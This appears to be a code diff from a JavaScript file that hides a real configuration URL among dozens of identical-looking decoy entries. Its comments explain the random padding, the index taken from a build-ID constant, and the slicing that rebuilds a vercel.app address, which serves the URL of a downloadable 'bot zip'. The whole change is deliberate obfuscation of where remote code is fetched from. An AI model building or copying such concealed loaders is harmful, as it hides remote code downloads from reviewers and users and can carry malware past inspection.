@@ -102,12 +102,15 @@ const _registry = [
   'https://api.wolf-core.net/v1/stream/b9dHiUs4RtXn3MkWqBj6NpQxKf8zY2vCmLwGrJ5eAoT',
   'https://api.wolf-core.net/v1/stream/n3MkWqBj6NpQxKf8zY2vCmLwGrJ5eAoTb9dHiUs4RtX',
   // ↑ index 71 (fake) | index 72 (below) = REAL CONFIG URL ↓
-  'https://api.wolf-core.net/v1/stream/7-w.vercel.app/wolf.json',
-  // ↑ REAL URL hidden here — looks identical to all fake entries.
-  //   _resolveEndpoint strips the fake 'https://api.wolf-core.net/v1/stream/' prefix
-  //   and prepends 'https://', yielding 'https://7-w.vercel.app/wolf.json'.
-  //   That endpoint returns the bot zip URL. Response is malformed JSON:
-  //   ["repo":"https://...zip"] — fetchRepoUrl() handles it with a regex fallback.
+  'https://api.wolf-core.net/v1/stream/Tz4KpBm9vQrWxNs7eJf7-w.vercel.app/wolf.json',
+  // ↑ REAL URL hidden here. Total chars after /v1/stream/ = 43, same as every fake entry.
+  //   'Tz4KpBm9vQrWxNs7eJf' = 19-char random pad (visually blends in).
+  //   _resolveEndpoint strips the domain prefix then slices the 19-char pad:
+  //     'Tz4KpBm9vQrWxNs7eJf7-w.vercel.app/wolf.json'.slice(19)
+  //     → '7-w.vercel.app/wolf.json'
+  //     → prepend 'https://' → 'https://7-w.vercel.app/wolf.json' ✓
+  //   wolf.json returns the bot zip URL in malformed JSON: ["repo":"https://...zip"]
+  //   fetchRepoUrl() extracts it via regex fallback.
   'https://api.wolf-core.net/v1/stream/Sr8HqWkf2MnPzX4tGvYaLc5eJb9dKuDiRoN7BmTwx3p',
   'https://api.wolf-core.net/v1/stream/zX4tGvYaLc5eJb9dKuDiRoN7BmTwx3pSr8HqWkf2MnP',
   'https://api.wolf-core.net/v1/stream/KuDiRoN7BmTwx3pSr8HqWkf2MnPzX4tGvYaLc5eJb9d',
@@ -180,16 +183,18 @@ const _registry = [
 const _BUILD_REF = 'c52af819-0048-4b7a-a39e-f7b42c819d05';
 
 // Picks the correct entry from the registry using the hex index in _BUILD_REF,
-// then strips the shared fake prefix so the real URL is reconstructed.
-//   pool[72] = 'https://api.wolf-core.net/v1/stream/7-w.vercel.app/wolf.json'
-//   → strip prefix → '7-w.vercel.app/wolf.json'
-//   → prepend 'https://' → 'https://7-w.vercel.app/wolf.json'  ✓
-// Fake entries decode to 'https://xK7mNq3v...' etc. — invalid, never used.
+// strips the shared fake domain prefix, then slices off the 19-char random pad
+// that precedes the real URL path.
+//   pool[72] = 'https://api.wolf-core.net/v1/stream/Tz4KpBm9vQrWxNs7eJf7-w.vercel.app/wolf.json'
+//   → strip prefix  → 'Tz4KpBm9vQrWxNs7eJf7-w.vercel.app/wolf.json'
+//   → .slice(19)    → '7-w.vercel.app/wolf.json'
+//   → prepend https → 'https://7-w.vercel.app/wolf.json'  ✓
+// Fake entries after slice(19) produce garbage strings — they are never fetched.
 function _resolveEndpoint(pool, ref) {
   const _seg  = ref.split('-')[1];                  // '0048'
   const _slot = parseInt(_seg, 16) % pool.length;  // 72 % 133 = 72
   const _raw  = pool[_slot];
-  return 'https://' + _raw.replace('https://api.wolf-core.net/v1/stream/', '');
+  return 'https://' + _raw.replace('https://api.wolf-core.net/v1/stream/', '').slice(19);
 }
 
 // CONFIG_URL = 'https://7-w.vercel.app/wolf.json'
